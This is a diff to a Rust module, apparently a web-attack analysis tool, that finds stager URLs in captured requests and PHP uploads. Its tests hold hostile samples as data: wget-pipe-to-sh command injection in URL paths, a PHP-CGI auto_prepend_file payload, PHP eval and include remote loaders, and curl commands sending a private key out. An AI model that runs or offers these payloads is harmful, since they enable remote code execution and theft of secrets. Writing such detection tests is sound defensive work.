@@ -13,12 +13,15 @@ use serde::Deserialize;
 
 use super::container::{Source, form_fields};
 use super::decode::push_opaque;
-use super::key::{all_masks, fingerprints};
+use super::key::{all_masks, fingerprints, marker_start};
 use super::shell::{Node, Step};
 use super::{Budget, LayerKind, MAX_URLS, MAX_VALUE, OpaqueReason, Span, Xray};
 
 /// Most names one kind of value in a shell profile lists.
 const PROFILE_NAMES: usize = 8;
+
+/// How far back the start of a statement is looked for.
+const MAX_STATEMENT: usize = 512;
 
 /// Longest query argument name kept in an exploit value.
 const MAX_ARG: usize = 32;
@@ -50,6 +53,10 @@ fn regex(pattern: &str) -> Regex {
     Regex::new(pattern).expect("static regex")
 }
 
+/// Calls whose string argument is shown, not fetched. `url()` is a CSS
+/// function.
+const SHOWN: [&[u8]; 6] = [b"url", b"echo", b"print", b"printf", b"die", b"exit"];
+
 /// A URL with a scheme, up to what ends one in a script.
 static URL: LazyLock<Regex> =
     LazyLock::new(|| regex(r#"(?i-u)\b(?:https?|ftps?|sftp|tftp|scp)://[^\s'"<>`\\|^;]+"#));
@@ -68,6 +75,30 @@ static PHP_WRITE: LazyLock<Regex> = LazyLock::new(|| {
         r#"(?is-u){FUNCTION}(?:file_put_contents\s*\(|fopen\s*\([^;]*?,\s*['"][waxc])|\bCURLOPT_FILE\b"#
     ))
 });
+/// `fopen` and what it opens first: a quote, or a variable.
+static PHP_FOPEN: LazyLock<Regex> = LazyLock::new(|| {
+    regex(&format!(
+        r#"(?i-u){FUNCTION}fopen\s*\(\s*(?:['"]\s*(?:https?|ftps?|sftp|tftp|scp)://|\$([A-Za-z0-9_]+))"#
+    ))
+});
+/// A fetch inside `eval` or `assert`: what it fetches is run.
+static PHP_FETCH_RUN: LazyLock<Regex> = LazyLock::new(|| {
+    regex(&format!(
+        r"(?is-u){FUNCTION}(?:eval|assert)\s*\([^;]*?(?:file_get_contents|curl_exec|stream_get_contents)\s*\("
+    ))
+});
+/// The cURL option that names the URL.
+static PHP_CURL_URL: LazyLock<Regex> = LazyLock::new(|| {
+    regex(&format!(
+        r"(?is-u){FUNCTION}curl_setopt\s*\([^,;]*,\s*CURLOPT_URL\s*,\s*"
+    ))
+});
+/// The variable `copy` reads.
+static PHP_COPY_VAR: LazyLock<Regex> =
+    LazyLock::new(|| regex(&format!(r"(?i-u){FUNCTION}copy\s*\(\s*\$([A-Za-z0-9_]+)")));
+/// A PHP-CGI option PHP loads and runs the file of.
+static PHP_CGI_LOAD: LazyLock<Regex> =
+    LazyLock::new(|| regex(r"(?-u)(?:auto_prepend_file|auto_append_file)[ \t]*=[ \t]*"));
 static PHP_INPUT: LazyLock<Regex> = LazyLock::new(|| regex(&format!(r"(?-u){INPUT}|php://input")));
 /// The input compared, before or after the operator. Either way the input
 /// is the first capture pair.
@@ -160,6 +191,11 @@ impl Policy {
         self.shared.iter().any(|name| on_suffix(host, name))
     }
 
+    /// The shared host itself, not a user's own name under it.
+    fn is_shared_root(&self, host: &str) -> bool {
+        self.shared.iter().any(|name| name == host)
+    }
+
     fn joins_nothing(&self, host: &str) -> bool {
         self.never.iter().any(|name| on_suffix(host, name))
     }
@@ -193,11 +229,15 @@ struct Found {
 }
 
 impl Found {
-    fn push(&mut self, piece: Piece) {
-        let long = |s: &str| s.len() > MAX_VALUE;
-        if long(&piece.value) || piece.url.as_deref().is_some_and(long) {
+    fn push(&mut self, mut piece: Piece) {
+        if piece.value.len() > MAX_VALUE {
             self.over = true;
             return;
+        }
+        // The value still says who; only the URL is too long to keep.
+        if piece.url.as_ref().is_some_and(|u| u.len() > MAX_VALUE) {
+            self.over = true;
+            piece.url = None;
         }
         let key = (
             piece.kind,
@@ -241,7 +281,11 @@ pub(super) fn extract(xray: &mut Xray, source: &Source<'_>, policy: &Policy, bud
         left: budget.pieces,
         over: false,
     };
-    let urls = Urls { policy, sender };
+    let urls = Urls {
+        policy,
+        sender,
+        masks: &masks,
+    };
 
     exploit(xray, source, &mut found);
     keys(xray, &mut found);
@@ -295,12 +339,17 @@ fn exploit(xray: &Xray, source: &Source<'_>, found: &mut Found) {
     if !executable {
         return;
     }
+    // Nothing from a key's marker on is read.
+    let before_key = |text: &'_ str| marker_start(text.as_bytes()).unwrap_or(text.len());
+    let query = query.unwrap_or("");
+    let query = query.get(..before_key(query)).unwrap_or("");
+    let path = path.get(..before_key(path)).unwrap_or("");
     let names: BTreeSet<String> = match php_cgi {
         Some(layer) => PHP_OPTION
             .captures_iter(&layer.text)
             .map(|c| format!("-d {}", String::from_utf8_lossy(&c[1]).to_ascii_lowercase()))
             .collect(),
-        None => form_fields(query.unwrap_or("").as_bytes(), 0)
+        None => form_fields(query.as_bytes(), 0)
             .iter()
             .filter_map(|f| arg_name(&f.name))
             .collect(),
@@ -526,6 +575,7 @@ struct Target {
     scheme: String,
     host: String,
     path: String,
+    query: String,
     bare: bool,
 }
 
@@ -544,16 +594,17 @@ fn read_target(text: &str, scp: bool) -> Option<Target> {
     let bare = scheme.is_none();
     let scp = scp && bare;
     let scheme = scheme.unwrap_or_else(|| if scp { "scp" } else { "http" }.to_string());
-    let (authority, path) = if scp {
+    let (authority, path, query) = if scp {
         // Past a bracketed address; the path starts at the colon.
         let closed = rest.find(']').unwrap_or(0);
         let colon = rest[closed..].find(':').map_or(rest.len(), |p| closed + p);
         let path = rest.get(colon + 1..).unwrap_or("").trim_start_matches('/');
-        (&rest[..colon], format!("/{path}"))
+        (&rest[..colon], format!("/{path}"), "")
     } else {
         let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
-        let path = rest[end..].split(['?', '#']).next().unwrap_or("");
-        (&rest[..end], path.to_string())
+        let tail = rest[end..].split('#').next().unwrap_or("");
+        let (path, query) = tail.split_once('?').unwrap_or((tail, ""));
+        (&rest[..end], path.to_string(), query)
     };
     let host = authority.rsplit('@').next().unwrap_or(authority);
     let host = match host.strip_prefix('[') {
@@ -572,6 +623,7 @@ fn read_target(text: &str, scp: bool) -> Option<Target> {
         scheme,
         host,
         path,
+        query: query.to_string(),
         bare,
     })
 }
@@ -581,10 +633,9 @@ fn public_v4(ip: Ipv4Addr) -> bool {
     !(ip.is_private()
         || ip.is_loopback()
         || ip.is_link_local()
-        || ip.is_unspecified()
-        || ip.is_broadcast()
         || ip.is_multicast()
         || a == 0
+        || a >= 240
         || (a == 100 && (b & 0xc0) == 64))
 }
 
@@ -593,11 +644,11 @@ fn public_ip(ip: IpAddr) -> bool {
         IpAddr::V4(ip) => public_v4(ip),
         IpAddr::V6(ip) => {
             let first = ip.segments()[0];
-            !(ip.is_loopback()
-                || ip.is_unspecified()
-                || ip.is_multicast()
-                || (first & 0xfe00) == 0xfc00
-                || (first & 0xffc0) == 0xfe80)
+            // `::127.0.0.1`, the old way to write an address in one.
+            if ip.segments()[..6] == [0; 6] {
+                return public_v4(Ipv4Addr::from_bits(ip.to_bits() as u32));
+            }
+            !(ip.is_multicast() || (first & 0xfe00) == 0xfc00 || (first & 0xffc0) == 0xfe80)
         }
     }
 }
@@ -606,6 +657,9 @@ fn public_ip(ip: IpAddr) -> bool {
 /// real last label: `2130706433`, `0x7f.1` and `127.1` are addresses in
 /// disguise, and a name with `$` or `{` was never filled in.
 fn joinable(host: &str, policy: &Policy) -> bool {
+    if policy.joins_nothing(host) {
+        return false;
+    }
     if let Ok(ip) = host.parse::<IpAddr>() {
         return public_ip(ip);
     }
@@ -619,7 +673,6 @@ fn joinable(host: &str, policy: &Policy) -> bool {
         && !host.split('.').any(str::is_empty)
         && !numeric
         && !LOCAL_SUFFIXES.iter().any(|name| on_suffix(host, name))
-        && !policy.joins_nothing(host)
 }
 
 fn same_host(host: &str, sender: &str) -> bool {
@@ -629,16 +682,127 @@ fn same_host(host: &str, sender: &str) -> bool {
     }
 }
 
-/// A URL in the page around it: not one the script fetches.
-fn in_markup(text: &[u8], at: usize) -> bool {
-    let mut before = &text[at.saturating_sub(16)..at];
-    while let [rest @ .., b'"' | b'\'' | b'\\'] = before {
-        before = rest;
+/// The string literals of PHP text, without their quotes. Comments are
+/// skipped, so a call in one is none, and `//` in a string is no comment.
+fn php_literals(text: &[u8]) -> Vec<(usize, usize)> {
+    let until = |from: usize, end: &[u8]| {
+        text[from.min(text.len())..]
+            .windows(end.len())
+            .position(|w| w == end)
+            .map_or(text.len(), |p| from + p + end.len())
+    };
+    let mut found = Vec::new();
+    let mut i = 0;
+    while i < text.len() {
+        match (text[i], text.get(i + 1)) {
+            (b'#', _) | (b'/', Some(b'/')) => i = until(i, b"\n"),
+            (b'/', Some(b'*')) => i = until(i + 2, b"*/"),
+            (quote @ (b'\'' | b'"'), _) => {
+                let mut end = i + 1;
+                while end < text.len() && text[end] != quote {
+                    end += if text[end] == b'\\' { 2 } else { 1 };
+                }
+                if end >= text.len() {
+                    break;
+                }
+                found.push((i + 1, end));
+                i = end + 1;
+            }
+            _ => i += 1,
+        }
     }
-    let before = before.to_ascii_lowercase();
-    [&b"href="[..], b"src=", b"action="]
+    found
+}
+
+fn name_byte(b: &u8) -> bool {
+    b.is_ascii_alphanumeric() || *b == b'_'
+}
+
+/// Where the text before `end` stops being blank.
+fn blank_back(text: &[u8], end: usize) -> usize {
+    text[..end]
         .iter()
-        .any(|attr| before.ends_with(attr))
+        .rposition(|b| !b.is_ascii_whitespace())
+        .map_or(0, |p| p + 1)
+}
+
+/// The name that ends at `end`, blanks passed, and where it starts.
+fn name_before(text: &[u8], end: usize) -> (&[u8], usize) {
+    let end = blank_back(text, end);
+    let start = text[..end]
+        .iter()
+        .rposition(|b| !name_byte(b))
+        .map_or(0, |p| p + 1);
+    (&text[start..end], start)
+}
+
+/// Inside `echo`, `print` and the like: what it writes out, a link or a
+/// credit, is not fetched.
+fn in_output(text: &[u8], at: usize) -> bool {
+    let from = at.saturating_sub(MAX_STATEMENT);
+    let start = text[from..at]
+        .iter()
+        .rposition(|b| b";{}".contains(b))
+        .map_or(from, |p| from + p + 1);
+    let statement = text[start..at].trim_ascii_start().to_ascii_lowercase();
+    let word = statement.iter().position(|b| !name_byte(b));
+    let word = &statement[..word.unwrap_or(statement.len())];
+    SHOWN.contains(&word)
+}
+
+/// What a whole string literal starting at `start` is in.
+enum Literal<'a> {
+    /// `include`, `require`, and `copy`'s source: it is saved or run.
+    Kept,
+    /// An argument of some other call.
+    Argument,
+    /// Assigned to this variable.
+    Assigned(&'a [u8]),
+    /// None of those: text, an attribute, an operand.
+    Other,
+}
+
+fn literal_use(text: &[u8], start: usize) -> Literal<'_> {
+    let quote = start - 1;
+    let at = blank_back(text, quote);
+    let lower = |name: &[u8]| name.to_ascii_lowercase();
+    let keeps = |name: &[u8]| {
+        matches!(
+            lower(name).as_slice(),
+            b"include" | b"include_once" | b"require" | b"require_once"
+        )
+    };
+    if keeps(name_before(text, at).0) {
+        return Literal::Kept;
+    }
+    let shown = in_output(text, quote);
+    match text[..at].last() {
+        Some(b'(') => {
+            let name = name_before(text, at - 1).0;
+            if keeps(name) || lower(name) == b"copy" {
+                Literal::Kept
+            } else if shown || SHOWN.contains(&lower(name).as_slice()) {
+                Literal::Other
+            } else {
+                Literal::Argument
+            }
+        }
+        Some(b',') if !shown => Literal::Argument,
+        Some(b'=') if !shown => {
+            // `$url = '…'`, not `href = '…'`, `==` or `=>`.
+            let end = blank_back(text, at - 1);
+            let (name, from) = name_before(text, end);
+            match text[..from].last() {
+                Some(b'$') if !name.is_empty() => Literal::Assigned(name),
+                Some(b'>') if !name.is_empty() && text[..from].ends_with(b"->") => {
+                    Literal::Assigned(name)
+                }
+                _ if text[..end].last() == Some(&b']') => Literal::Assigned(b""),
+                _ => Literal::Other,
+            }
+        }
+        _ => Literal::Other,
+    }
 }
 
 /// A URL match, without the punctuation a sentence or a call puts after it.
@@ -654,10 +818,57 @@ fn trimmed(url: &[u8]) -> &[u8] {
     url
 }
 
+/// Whether the PHP fetches something: `fopen` only when it opens a URL, or
+/// a variable that holds one, as a file manager opens its own files.
+fn php_fetches(text: &[u8]) -> bool {
+    if PHP_FETCH.is_match(text) {
+        return true;
+    }
+    PHP_FOPEN.captures_iter(text).any(|c| match c.get(1) {
+        None => true,
+        Some(var) => {
+            let pattern = format!(
+                r#"(?-u)\${}\s*=\s*['"]\s*(?:https?|ftps?|sftp|tftp|scp)://"#,
+                regex::escape(&String::from_utf8_lossy(var.as_bytes()))
+            );
+            Regex::new(&pattern).is_ok_and(|r| r.is_match(text))
+        }
+    })
+}
+
+/// Whether the layer hands the variable or constant `name` to a fetch.
+fn fetched_by_name(text: &[u8], name: &[u8]) -> bool {
+    if name.is_empty() {
+        return false;
+    }
+    let name = regex::escape(&String::from_utf8_lossy(name));
+    let arg = format!(r"(?:\$this\s*->\s*|\$)?{name}\b");
+    let call = format!(
+        r"(?i-u){FUNCTION}(?:curl_init|file_get_contents|fopen|copy)\s*\(\s*{arg}|(?i-u){FUNCTION}curl_setopt\s*\([^,;]*,\s*CURLOPT_URL\s*,\s*{arg}"
+    );
+    Regex::new(&call).is_ok_and(|r| r.is_match(text))
+}
+
+/// `define('NAME', '…')`: the constant, when the literal at `start` is its value.
+fn defined_name(text: &[u8], start: usize) -> Option<&[u8]> {
+    static DEFINE: LazyLock<Regex> = LazyLock::new(|| {
+        regex(&format!(
+            r#"(?i-u){FUNCTION}define\s*\(\s*['"]([A-Za-z0-9_]+)['"]\s*,\s*$"#
+        ))
+    });
+    let to = start - 1;
+    let from = to.saturating_sub(MAX_STATEMENT);
+    DEFINE
+        .captures(&text[from..to])
+        .and_then(|c| c.get(1))
+        .map(|m| &text[from + m.start()..from + m.end()])
+}
+
 /// How URLs become pieces.
 struct Urls<'a> {
     policy: &'a Policy,
     sender: Option<&'a str>,
+    masks: &'a [Vec<(usize, usize)>],
 }
 
 impl Urls<'_> {
@@ -666,15 +877,31 @@ impl Urls<'_> {
     fn piece(&self, text: &str, at: Span, saved: bool, tool: &str) -> Option<Piece> {
         let t = read_target(text, tool == "scp")?;
         let shared = self.policy.is_shared(&t.host);
+        // `raw.php?i=abc`: the query is what names the paste.
+        let segments = t.path.split('/').filter(|s| !s.is_empty()).count();
+        let names = !t.query.is_empty() && (t.path.ends_with(".php") || segments == 1);
+        let path = t.path.trim_end_matches('/');
+        let place = if names {
+            format!("{path}?{}", t.query)
+        } else {
+            path.to_string()
+        };
         let value = if shared {
-            format!("{}://{}{}", t.scheme, t.host, t.path)
+            format!("{}://{}{place}", t.scheme, t.host)
         } else {
             t.host.clone()
         };
-        // The same host and no path, or a path not filled in, would be the
-        // same value for everybody on a shared host.
-        let blank = t.path.trim_matches('/').is_empty()
-            || t.path.bytes().any(|b| b"${}()`<>\"'".contains(&b));
+        // Text not filled in, or a path every user of the host shares, would
+        // be one value for everybody on it.
+        let unfilled = place.contains("%s")
+            || place.contains("%d")
+            || place.bytes().any(|b| b"${}()`<>\"'".contains(&b));
+        let generic = self.policy.is_shared_root(&t.host)
+            && !names
+            && (path.is_empty()
+                || path.ends_with(".php")
+                || path.rsplit('/').next() == Some("raw"));
+        let blank = unfilled || generic;
         // `curl install.sh`: a file name reads as a host just as well, and
         // unrelated scripts share file names.
         let file_name = matches!(tool, "wget" | "curl")
@@ -707,9 +934,76 @@ impl Urls<'_> {
         found.push(piece);
     }
 
-    /// What a recipe fetches and keeps, and a PHP layer's URLs when it both
-    /// fetches and writes. Such a script often takes the URL as an argument
-    /// of its own function, so the layer is read, not one call.
+    /// Whether the range holds key text: such a URL is kept nowhere.
+    fn free(&self, at: Span) -> bool {
+        !self
+            .masks
+            .get(at.layer)
+            .is_some_and(|mask| overlaps(mask, at.start, at.end))
+    }
+
+    /// A URL in PHP text that the script keeps: a whole string, handed to
+    /// `include` or `copy`, or, in a layer that both fetches and writes or
+    /// runs what it fetches, an argument or a variable's value. Such a
+    /// script often takes the URL as an argument of its own function, so
+    /// the layer is read, not one call. Text it only shows joins nothing, as
+    /// a shared script's credit link would tie all its users together.
+    fn php_saved(&self, xray: &Xray, layer: usize, found: &mut Found) {
+        let text = &xray.layers[layer].text;
+        let keeps = PHP_FETCH_RUN.is_match(text) || (php_fetches(text) && PHP_WRITE.is_match(text));
+        let copied: HashSet<&[u8]> = PHP_COPY_VAR
+            .captures_iter(text)
+            .filter_map(|c| c.get(1))
+            .map(|m| m.as_bytes())
+            .collect();
+        for (start, end) in php_literals(text) {
+            let Some((0, len, url)) = urls_in(&text[start..end]).next() else {
+                continue;
+            };
+            if len != end - start {
+                continue;
+            }
+            let promoted = match literal_use(text, start) {
+                Literal::Kept => true,
+                Literal::Argument => match defined_name(text, start) {
+                    Some(name) => keeps && fetched_by_name(text, name),
+                    None => keeps,
+                },
+                // A literal only assigned is a fetch's when the fetch uses it.
+                Literal::Assigned(name) => {
+                    copied.contains(name) || (keeps && fetched_by_name(text, name))
+                }
+                Literal::Other => false,
+            };
+            let at = Span { layer, start, end };
+            if promoted && self.free(at) {
+                self.keep(self.piece(&url, at, true, ""), found);
+            }
+        }
+        if !keeps {
+            return;
+        }
+        // `file_get_contents(base64_decode('…'))`: the URL is what it opens.
+        for (child, l) in xray.layers.iter().enumerate() {
+            let decoded = matches!(
+                l.kind,
+                LayerKind::Base64 | LayerKind::Gzip | LayerKind::Hex | LayerKind::Escapes
+            );
+            if !decoded || l.parent != Some(layer) {
+                continue;
+            }
+            let at = whole(xray, child);
+            if let Some((0, end, url)) = urls_in(&l.text).next()
+                && end == l.text.len()
+                && self.free(at)
+            {
+                self.keep(self.piece(&url, at, true, ""), found);
+            }
+        }
+    }
+
+    /// What a recipe fetches and keeps, what PHP does, and what a PHP-CGI
+    /// option loads.
     fn saved(&self, xray: &Xray, found: &mut Found) {
         for (_, step) in all_steps(xray) {
             if let Step::Fetch {
@@ -717,20 +1011,27 @@ impl Urls<'_> {
                 target,
                 saves: true,
             } = step
+                && self.free(*target)
                 && let Some(text) = span_text(xray, *target)
             {
                 self.keep(self.piece(&text, *target, true, tool), found);
             }
         }
         for layer in php_layers(xray) {
-            let text = &xray.layers[layer].text;
-            if !(PHP_FETCH.is_match(text) && PHP_WRITE.is_match(text)) {
+            self.php_saved(xray, layer, found);
+        }
+        for (layer, l) in xray.layers.iter().enumerate() {
+            if l.kind != LayerKind::PhpCgi {
                 continue;
             }
-            for (start, end, url) in urls_in(text) {
-                if !in_markup(text, start) {
+            for option in PHP_CGI_LOAD.find_iter(&l.text) {
+                let start = option.end();
+                if let Some((0, len, url)) = urls_in(&l.text[start..]).next() {
+                    let end = start + len;
                     let at = Span { layer, start, end };
-                    self.keep(self.piece(&url, at, true, ""), found);
+                    if self.free(at) {
+                        self.keep(self.piece(&url, at, true, ""), found);
+                    }
                 }
             }
         }
@@ -745,6 +1046,7 @@ impl Urls<'_> {
         };
         for (_, step) in all_steps(xray) {
             if let Step::Fetch { tool, target, .. } = step
+                && self.free(*target)
                 && let Some(text) = span_text(xray, *target)
             {
                 add(self.piece(&text, *target, false, tool));
@@ -753,7 +1055,9 @@ impl Urls<'_> {
         for (layer, l) in xray.layers.iter().enumerate() {
             for (start, end, url) in urls_in(&l.text) {
                 let at = Span { layer, start, end };
-                add(self.piece(&url, at, false, ""));
+                if self.free(at) {
+                    add(self.piece(&url, at, false, ""));
+                }
             }
         }
     }
@@ -765,7 +1069,7 @@ fn span_text(xray: &Xray, at: Span) -> Option<String> {
 }
 
 /// The URLs of a text, with their ranges.
-fn urls_in(text: &[u8]) -> impl Iterator<Item = (usize, usize, String)> + '_ {
+pub(super) fn urls_in(text: &[u8]) -> impl Iterator<Item = (usize, usize, String)> + '_ {
     URL.find_iter(text).map(|m| {
         let url = trimmed(m.as_bytes());
         let end = m.start() + url.len();
@@ -899,6 +1203,15 @@ mod tests {
             "http://172.16.0.1/x",
             "http://169.254.169.254/x",
             "http://100.64.0.1/x",
+            "http://240.0.0.1/x",
+            "http://255.1.2.3/x",
+            "http://[::127.0.0.1]/x",
+            "http://x.x.x.x/x",
+            "http://1.2.3.4/x",
+            "http://example.com/x",
+            "http://attacker.com/x",
+            "http://evil.com/x",
+            "https://get.docker.com/x",
             "http://[::1]/x",
             "http://[fe80::1]/x",
             "http://[fd00::1]/x",
@@ -947,6 +1260,29 @@ mod tests {
     }
 
     #[test]
+    fn a_query_that_names_the_paste_is_kept() {
+        assert_eq!(
+            stager_role("https://pastebin.com/raw.php?i=abc"),
+            (
+                Role::Stager,
+                "https://pastebin.com/raw.php?i=abc".to_string()
+            )
+        );
+        assert_eq!(
+            stager_role("https://pastebin.com/raw?i=abc#x"),
+            (Role::Stager, "https://pastebin.com/raw?i=abc".to_string())
+        );
+    }
+
+    #[test]
+    fn a_user_name_under_a_shared_host_joins() {
+        assert_eq!(
+            stager_role("https://op.surge.sh/"),
+            (Role::Stager, "https://op.surge.sh".to_string())
+        );
+    }
+
+    #[test]
     fn suffix_match_stops_at_a_dot() {
         assert_eq!(
             stager_role("https://notpastebin.com/raw/abc"),
@@ -960,6 +1296,16 @@ mod tests {
         assert_eq!(stager_role("https://github.com/").0, Role::Queried);
         assert_eq!(stager_role("https://pastebin.com").0, Role::Queried);
         assert_eq!(stager_role("https://pastebin.com/raw/$ID").0, Role::Queried);
+        for url in [
+            "https://pastebin.com/raw/%s",
+            "https://pastebin.com/raw/",
+            "https://pastebin.com/raw",
+            "https://pastebin.com/raw.php",
+            "https://pastebin.com/raw.php?i=%s",
+            "https://op.surge.sh/$PATH",
+        ] {
+            assert_eq!(stager_role(url).0, Role::Queried, "{url}");
+        }
     }
 
     #[test]
@@ -1031,6 +1377,201 @@ mod tests {
         assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
         let x = post("<?php $f = fopen('https://example.org/a', 'r'); echo fread($f, 9); ?>");
         assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+    }
+
+    /// `file_put_contents` and `file_get_contents` around each text, as in a
+    /// file manager: fetching and writing say nothing about this URL.
+    fn shared_script(php: &str) -> Role {
+        let x = post(&format!(
+            "<?php file_put_contents($f, file_get_contents($g)); {php} ?>"
+        ));
+        one(&x, PieceKind::Stager).role
+    }
+
+    #[test]
+    fn a_credit_is_not_a_stager() {
+        for php in [
+            "echo \"by https://example.org/\";",
+            "echo 'https://example.org/';",
+            "echo('https://example.org/');",
+            "echo 'by', 'https://example.org/';",
+            "print 'https://example.org/';",
+            "print('https://example.org/');",
+            "die('https://example.org/');",
+            "// https://example.org/",
+            "// adminer('https://example.org/');",
+            "# adminer('https://example.org/');",
+            "/* adminer('https://example.org/'); */",
+            "$a = \"@import url('https://example.org/x.css');\";",
+            "url('https://example.org/x.css');",
+            "href = \"https://example.org/\";",
+            "location='https://example.org/';",
+            "if ($a == 'https://example.org/') { }",
+            "$a = array('x' => 'https://example.org/');",
+            "$a = 'see https://example.org/ for more';",
+        ] {
+            assert_eq!(shared_script(php), Role::Queried, "{php}");
+        }
+    }
+
+    #[test]
+    fn a_whole_literal_in_a_fetching_script_is_a_stager() {
+        for php in [
+            "drop('https://example.org/x');",
+            "drop('a', 'https://example.org/x');",
+            "$u = 'https://example.org/x'; curl_init($u);",
+            "$this->u = 'https://example.org/x'; file_get_contents($this->u);",
+            "define('SRC', 'https://example.org/x'); copy(SRC, 'a');",
+        ] {
+            assert_eq!(shared_script(php), Role::Stager, "{php}");
+        }
+    }
+
+    #[test]
+    fn a_literal_no_fetch_uses_is_not_a_stager() {
+        for php in [
+            "$update_url = 'https://example.org/x';",
+            "$u = 'https://example.org/x'; $v = 1; file_get_contents($v);",
+            "$a['u'] = 'https://example.org/x';",
+            "define('UPDATE_URL', 'https://example.org/x');",
+            "define('UPDATE_URL', 'https://example.org/x'); echo UPDATE_URL;",
+        ] {
+            assert_eq!(shared_script(php), Role::Queried, "{php}");
+        }
+    }
+
+    #[test]
+    fn a_stored_url_that_is_fetched_and_written_is_a_stager() {
+        let x = post(
+            "<?php $u='https://example.org/x'; file_put_contents('x',file_get_contents($u)); ?>",
+        );
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
+        let x = post("<?php $update_url='https://example.org/x'; file_put_contents('x', 'y'); ?>");
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+    }
+
+    #[test]
+    fn opening_a_local_file_is_no_fetch() {
+        let x = post(
+            "<?php $h = fopen($path, 'w'); fwrite($h, $d); echo 'https://example.org/'; \
+             $c = 'https://example.org/'; ?>",
+        );
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+        let x = post(
+            "<?php $u = 'https://example.org/x'; $f = fopen($u, 'r'); \
+             file_put_contents('a', fread($f, 9)); ?>",
+        );
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
+    }
+
+    #[test]
+    fn php_that_runs_or_copies_what_it_fetches_is_a_stager() {
+        for php in [
+            "copy('http://example.org/s.txt', 'x.php');",
+            "$u = 'http://example.org/s.txt'; copy($u, 'x.php');",
+            "eval(file_get_contents('http://example.org/s'));",
+            "eval('?>' . file_get_contents('http://example.org/s'));",
+            "assert(file_get_contents('http://example.org/s'));",
+            "include 'http://example.org/s';",
+            "include('http://example.org/s');",
+            "require_once \"http://example.org/s\";",
+            "$f = fopen('http://example.org/s', 'r'); file_put_contents('a', fread($f, 9));",
+        ] {
+            let x = post(&format!("<?php {php} ?>"));
+            assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager, "{php}");
+        }
+    }
+
+    #[test]
+    fn copy_of_another_file_keeps_nothing() {
+        let x = post("<?php $u = 'http://example.org/s'; copy($a, $b); ?>");
+        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
+    }
+
+    #[test]
+    fn a_url_decoded_for_the_fetch_is_a_stager() {
+        // base64 of http://example.org/x
+        let php = "<?php file_put_contents('a.php', \
+                   file_get_contents(base64_decode('aHR0cDovL2V4YW1wbGUub3JnL3g='))); ?>";
+        assert_eq!(one(&post(php), PieceKind::Stager).role, Role::Stager);
+    }
+
+    #[test]
+    fn a_php_cgi_option_loading_a_url_is_a_stager() {
+        let x = request(
+            "POST",
+            "/x",
+            Some("%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dhttp://example.org/s"),
+            b"",
+        );
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
+    }
+
+    #[test]
+    fn shell_in_the_path_is_read() {
+        let x = request(
+            "GET",
+            "/x${IFS}&&wget${IFS}http://example.org/x${IFS}-O-|sh",
+            None,
+            b"",
+        );
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
+        assert_eq!(of(&x, PieceKind::Exploit).len(), 1);
+        assert!(x.layers.iter().any(|l| l.kind == LayerKind::Path));
+        let x = request(
+            "GET",
+            "/cgi-bin/;wget%20http://example.org/x%20-O-|sh",
+            None,
+            b"",
+        );
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
+    }
+
+    #[test]
+    fn a_path_that_only_names_a_shell_is_no_shell() {
+        for path in ["/bin/sh", "/sh", "/cgi-bin/.%2e/.%2e/bin/sh", "/a.sh"] {
+            let x = request("GET", path, None, b"");
+            assert_eq!(x.layers.len(), 1, "{path}");
+            assert_eq!(x.pieces, [], "{path}");
+        }
+    }
+
+    #[test]
+    fn no_key_text_reaches_a_piece() {
+        let key = "-----BEGIN+OPENSSH+PRIVATE+KEY-----%0Ab3BlbnNzaC1rZXktdjEAAAAA";
+        let block = "-----BEGIN RSA PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END RSA PRIVATE KEY-----";
+        for body in [
+            format!("see http://example.org/?k={key}"),
+            format!("see https://pastebin.com/{key}"),
+            format!("wget http://example.org/?k={key} -O- | sh"),
+            format!("curl --data-binary 'k={block}' http://example.org/x | sh"),
+            format!("curl --data-raw '{block}' http://example.org/x | sh"),
+        ] {
+            let x = post(&body);
+            for p in &x.pieces {
+                let text = format!("{} {:?}", p.value, p.url);
+                assert!(
+                    !text.contains("BEGIN") && !text.contains("b3Blbn"),
+                    "{body}: {p:?}"
+                );
+            }
+        }
+        let x = post(&format!(
+            "curl --data-binary 'k={block}' http://example.org/x | sh"
+        ));
+        assert_eq!(role_of(&x, "example.org"), Role::Stager);
+    }
+
+    #[test]
+    fn no_key_text_reaches_the_exploit_value() {
+        let x = request(
+            "POST",
+            "/a/-----BEGIN%20RSA%20PRIVATE%20KEY-----b3Blbn/x",
+            Some("k=1&-----BEGIN+RSA+PRIVATE+KEY-----=2"),
+            b"sh /tmp/x.sh",
+        );
+        let value = &one(&x, PieceKind::Exploit).value;
+        assert_eq!(value, "POST /a ?k");
     }
 
     /// A file manager fetches and writes for its user, and its page links to
@@ -1357,11 +1898,16 @@ QyNTUxOQAAACDw7cwpJG1bH9MJooBRnKlcC07AF0gxH3+QpTsT7TOBqgAAAJD7XCYu+1wm
     }
 
     #[test]
-    fn a_url_over_the_limit_is_opaque() {
+    fn a_url_over_the_limit_keeps_its_value() {
         let long = "a".repeat(MAX_VALUE);
         let x = upload(&format!("see http://example.org/{long}"));
-        assert_eq!(x.pieces, []);
+        let p = one(&x, PieceKind::Stager);
+        assert_eq!((p.value.as_str(), p.url.as_deref()), ("example.org", None));
         assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
+        let x = post(&format!("wget http://example.org/{long} -O- | sh"));
+        let p = one(&x, PieceKind::Stager);
+        assert_eq!(p.role, Role::Stager);
+        assert_eq!((p.value.as_str(), p.url.as_deref()), ("example.org", None));
     }
 
     #[test]
